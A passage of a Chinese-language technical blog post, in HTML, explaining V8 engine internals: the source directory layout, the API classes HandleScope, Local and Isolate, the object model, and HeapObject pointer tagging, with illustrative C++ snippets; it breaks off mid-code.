    <content type="html"><![CDATA[<h2 id="v8代码组成"><a href="#v8代码组成" class="headerlink" title="v8代码组成"></a>v8代码组成</h2><h3 id="目录结构概要"><a href="#目录结构概要" class="headerlink" title="目录结构概要"></a>目录结构概要</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src ---+</span><br><span class="line">       |</span><br><span class="line">       +---arm</span><br><span class="line">       +---arm64</span><br><span class="line">       +---mips</span><br><span class="line">       +---mips64</span><br><span class="line">A      +---ia32</span><br><span class="line">       +---x64</span><br><span class="line">       +---ppc</span><br><span class="line">       +---s390</span><br><span class="line">       +---wasm</span><br><span class="line">       +---asmjs</span><br><span class="line">       |</span><br><span class="line">       +---ast</span><br><span class="line">       +---compiler</span><br><span class="line">B      +---compiler-dispatcher</span><br><span class="line">       +---interpreter</span><br><span class="line">       +---parsing</span><br><span class="line">       |</span><br><span class="line">       +---js</span><br><span class="line">       +---builtins</span><br><span class="line">C      +---runtime</span><br><span class="line">       +---snapshot</span><br><span class="line">       +---regexp</span><br><span class="line">       +---profiler</span><br><span class="line">       |</span><br><span class="line">D      +---ic</span><br><span class="line">       |</span><br><span class="line">       +---heap</span><br><span class="line">E      +---heap-symbols.h</span><br><span class="line">       +---zone</span><br><span class="line">       +---objects</span><br><span class="line">       |</span><br><span class="line">F      +---inspector</span><br><span class="line">       |</span><br><span class="line">       +---base</span><br><span class="line">       +---debug</span><br><span class="line">       +---tracing</span><br><span class="line">       +---extensions</span><br><span class="line">G      +---libplatform</span><br><span class="line">       +---libsampler</span><br><span class="line">       +---third_party</span><br><span class="line">       +---trap-handler</span><br><span class="line">       |</span><br><span class="line">       +---*.cc<span class="comment">/*.h</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br></pre></td></tr></table></figure><ul><li>A:存储汇编代码，反汇编程序，宏汇编程序，模拟器等，对于不同CPU不同。</li><li>B:code generation系统，例如parse, compile, interpreter, etc.</li><li>C:JS built-in function和runtime helper function</li><li>D:Inline Cache code </li><li>E:object model(对象模型)和memory(内存)相关代码</li><li>F:Inspector</li><li>G:Debugging and platform abstraction layer codes are stored.</li></ul><h3 id="必读代码"><a href="#必读代码" class="headerlink" title="必读代码"></a>必读代码</h3><ul><li>api.h/api.cc<br>An API for Embedder is defined.</li><li>objects.h/objects.cc<br>定义了v8的所有对象模型</li><li>compiler/compiler.cc<br>编译的入口点</li><li>compiler/pipeline.cc<br>和compiler.cc关联，放置TurboFan</li><li>runtime/runtime-*.cc<br>A runtime function is defined.</li><li>builtins/builtin-*.cc<br>A faster runtime function group. It is described in CodeStubAssembler (commentary) or Assembler.</li><li>interpreter/*.cc<br>Ignition解释器</li><li>ic/*.cc<br>Inline Caching的实现<br>存储Runtime(?)</li></ul><h2 id="v8的内部实现"><a href="#v8的内部实现" class="headerlink" title="v8的内部实现"></a>v8的内部实现</h2><h3 id="公开API"><a href="#公开API" class="headerlink" title="公开API"></a>公开API</h3><ul><li>v8::HandleScope<br>生成一个虚拟的作用域，监视（绑定）从v8的GC分配的对象</li><li>v8::Local<br>v8有GC，但c++没有GC<br>相反，它通过<a href="https://zh.wikipedia.org/wiki/RAII" target="_blank" rel="noopener">RAII</a> (Resource Acquisition Is Initialization)分配和释放资源<br>在C++中有一个称为析构函数的函数，当分配到stack上的类超出作用域并被丢弃时，该函数被调用。<br>通过v8::Local，当超出了类的作用域时，会自动调用析构函数，析构函数会自动释放资源，实现一种所谓的<a href="http://www.cnblogs.com/TenosDoIt/p/3456704.html" target="_blank" rel="noopener">智能指针</a>功能。<br>v8::Local是一个包装类，用于监视在c++中分配给堆的对象，并在调用析构函数时与当前的HandleScope一起删除。<br>例如：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>创建v8::HandleScope后，所有v8::Local都将分配给该v8::HandleScope。<br>因此，当在测试函数结束时调用handle_scope析构函数时，也会删除与v8 :: HandleScope相关的所有v8::Local。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-124518.png" alt=""></p><ul><li>v8::Handle<br>被v8::Local包装的类，但实际上链接到v8::HandleScope。<br>有些api会返回这个v8::Handle，但基本上它就像v8::Local一样使用。</li><li>v8::Isolate<br>v8::Isolate是v8代码库底层部分的一个非常特殊的部分。<br>最初v8有很多静态方法，对多线程没有太多考虑。<br>嗯，这是有问题的，因为Chromium必须分离进程并启动v8。<br>顺便说一句，事实证明，在Embedder端尝试多线程会导致相当大的问题。<br>出于这个原因，构建了v8::Isolate机制。<br>v8::Isolate是一个存储在<a href="https://blog.csdn.net/linyt/article/details/51931737" target="_blank" rel="noopener">线程本地存储（TLS）</a>中的巨大对象<br>几乎存储了与执行上下文链接的所有全局信息。<br>由于它存储在Tls中，因此可以透明地为每个线程提供不同的v8::Isolate，因此Embedder端可以在对其他线程不了解的情况下编写代码。<br><strong>内部使用的各种对象（FixedArray）和表示隐藏类等的Map类也是从这个v8::Isolate生成的</strong>。<br>几乎所有地方都传递了这个类，没有v8::Isolate就很难编写代码。<br>再次使用上面的示例代码<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-09-102213.jpg" alt=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>你还可以看到此函数也传递了v8::Isolate。<br>它是v8::Array::New等等，但是v8::Isoalte实际上生成了这个数组。<br>因此，在v8中，没有太多需要考虑线程冲突，所以这是一个相当方便的机制。</p><h3 id="v8-internal"><a href="#v8-internal" class="headerlink" title="v8::internal"></a>v8::internal</h3><p>除了外部公共API之外的所有类，都在v8::internal命名空间中定义。</p><h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><p>v8非常特殊，它在C++中创建自己的对象模型。<br>该对象模型在src/objects.h的开头注释中描述，<br>当它被简化和提取时，就会变成这样。</p><ul><li>Object<ul><li>Smi (immediate small integer)</li><li>HeapObject (superclass for everything allocated in the heap)<ul><li>JSReceiver (suitable for property access)<ul><li>JSObject</li><li>JSProxy</li></ul></li><li>FixedArrayBase<ul><li>ByteArray</li><li>BytecodeArray</li><li>FixedArray</li><li>FixedDoubleArray</li></ul></li><li>Name<ul><li>String</li><li>Symbol</li></ul></li><li>HeapNumber</li><li>BigInt</li><li>Cell</li><li>PropertyCell</li><li>PropertyArray</li><li>Code</li><li>AbstractCode, a wrapper around Code or BytecodeArray</li><li>Map</li><li>Oddball</li><li>Foreign</li><li>SmallOrderedHashTable</li><li>SharedFunctionInfo</li><li>Struct</li><li>WeakCell</li><li>FeedbackVector</li></ul></li></ul></li></ul><p>我们创建了一个以v8::i::Object为基类的对象树。<br>几乎所有在v8中使用的类都继承自v8::i::Object，这看起来像java。<br>v8不遵循c++方式使这个对象模型运行良好。<br>由于某些原因，这些类不通过c++类来创建字段。<br>这些类仅用于表示c++中的内存布局，并且所有字段都是通过直接为此指针指定偏移量来获得的。<br>换句话说，忽略c++对象布局，我们自己完全控制内存布局。<br>当以伪代码表示时，看起来像这样：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class SomeObject &#123;</span><br><span class="line">  <span class="function">Value* <span class="title">get_field1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    <span class="keyword">return</span> Value::Cast(self);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    *self = Smi::Cast(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> OBJECT_SIZE = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">32</span>;</span><br><span class="line">SomeObject* object = <span class="keyword">reinterpret_cast</span>&lt;SomeObject*&gt;(<span class="built_in">malloc</span>(OBJECT_SIZE));</span><br><span class="line">object-&gt;Initialize();</span><br><span class="line">object-&gt;get_filed1(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p>通过这种方式，你可以自己控制字段的偏移。<br>让我们了解一下层次结构顶端的两个分支：</p><h3 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h3><p>首先是v8::i::HeapObject。<br>由于v8::i::Object建立了如上所述的直接通过偏移的内存布局<br>在访问字段时，继承HeapObject的对象使用以下宏。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIELD_ADDR(p, offset) \</span></span><br><span class="line">  (<span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(p) + offset - kHeapObjectTag)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_FIELD(p, offset) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(FIELD_ADDR_CONST(p, offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是在GC并发标记为ON时以原子方式更新字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> v8_CONCURRENT_MARKING</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value)                             \</span></span><br><span class="line">  base::Relaxed_Store(                                            \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(FIELD_ADDR(p, offset)), \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(value));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object**&gt;(FIELD_ADDR(p, offset)) = value)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMI_ACCESSORS_CHECKED(holder, name, offset, condition) \</span></span><br><span class="line">  <span class="keyword">int</span> holder::name() <span class="keyword">const</span> &#123;                                   \</span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    Object* value = READ_FIELD(<span class="keyword">this</span>, offset);                  \</span><br><span class="line">    <span class="keyword">return</span> Smi::ToInt(value);                                  \</span><br><span class="line">  &#125;                                                            \</span><br><span class="line">  <span class="keyword">void</span> holder::set_#<span class="meta">#name(int value) &#123;                         \</span></span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    WRITE_FIELD(<span class="keyword">this</span>, offset, Smi::FromInt(value));            \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上它扩展如下。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::length() <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  Object* value = (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(</span><br><span class="line">  <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag)</span><br><span class="line">  <span class="keyword">return</span> Smi::ToInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::set_length(<span class="keyword">int</span> value) <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  base::Relaxed_Store(</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(</span><br><span class="line">          <span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag);</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(Smi::FromInt(value)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重要的是<br><code>reinterpret_cast&lt;const byte*&gt;(this) + kLengthOffset - kHeapObjectTag</code><br>在这部分中，我们看到在将特定字段的偏移量添加到此指针后减去kHeapObjectTag。<br>顺便说一句，kHeapObjectTag的定义如下。<br><code>const int kHeapObjectTag = 1</code><br>只有1，也就是说，只需在指针地址的末尾设置1即可。</p><p>以下是示例代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(</span><br><span class="line">      <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (<span class="number">2</span> + kHeapObjectTag)));</span><br><span class="line">  <span class="keyword">auto</span> heap_object = allocated + kHeapObjectTag;</span><br><span class="line">  heap_object[<span class="number">0</span>] = <span class="string">'m'</span>;</span><br><span class="line">  heap_object[<span class="number">1</span>] = <span class="string">'v'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld %ld %p %p %d\n"</span>, <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(allocated),</span><br><span class="line">         <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(heap_object), allocated, heap_object,</span><br><span class="line">         HasHeapObjectTag(heap_object));</span><br><span class="line">  <span class="built_in">free</span>(allocated);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果如下：<br><code>140289524108464 140289524108465 0x7f97b3400cb0 0x7f97b3400cb1 1</code><br>地址以1结尾。<br>另外，v8::i::HeapObject在开头有一个v8::Map对象来表示隐藏类，以便识别它自己的类型。<br>所以v8::i::HeapObject的内存布局如下。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-09-163310.png" alt=""><br>由于我们总是有一个表示类型的v8::Map，我们可以通过查看它来看到v8::i ::HeapObject的类型。<br>此外，写为Derived Object Header的部分根据继承的对象而不同（如果它是v8::i::FixedArray则是长度字段）。<br>下面是Map和JSObject C ++代码的简化表示<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Map</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">enum</span> InstanceType &#123;</span><br><span class="line">    JS_OBJECT,</span><br><span class="line">    JS_ARRAY,</span><br><span class="line">    JS_STRING</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_instance_type</span><span class="params">(InstanceType instance_type)</span> </span>&#123;</span><br><span class="line">    instance_type_ = instance_type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance_type_;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  InstanceType instance_type_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="keyword">sizeof</span>(Map);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> byte;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* Address;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapObject</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">value</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>)[<span class="number">0</span>];&#125;</span><br><span class="line">  Map::<span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize)-&gt;instance_type();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> top = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize - kHeapObjectTag;</span><br><span class="line">    <span class="built_in">free</span>(top);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Address <span class="title">NewType</span><span class="params">(Map::InstanceType instance_type, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(byte) * (size + kHeaderSize + kHeapObjectTag)));</span><br><span class="line">    <span class="keyword">auto</span> <span class="built_in">map</span> = <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(allocated);</span><br><span class="line">    <span class="built_in">map</span>-&gt;set_instance_type(instance_type);</span><br><span class="line">    <span class="keyword">return</span> allocated + kHeaderSize + kHeapObjectTag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSObject</span>:</span> <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSObject* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_OBJECT, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'o'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSObject*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSArray</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSArray* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_ARRAY, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSArray*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSString</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSString* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_STRING, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'s'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSString*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  JSObject* objects[] = &#123;</span><br><span class="line">    JSObject::New(),</span><br><span class="line">    JSArray::New(),</span><br><span class="line">    JSString::New()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> o = objects[i];</span><br><span class="line">    <span class="keyword">switch</span> (o-&gt;instance_type()) 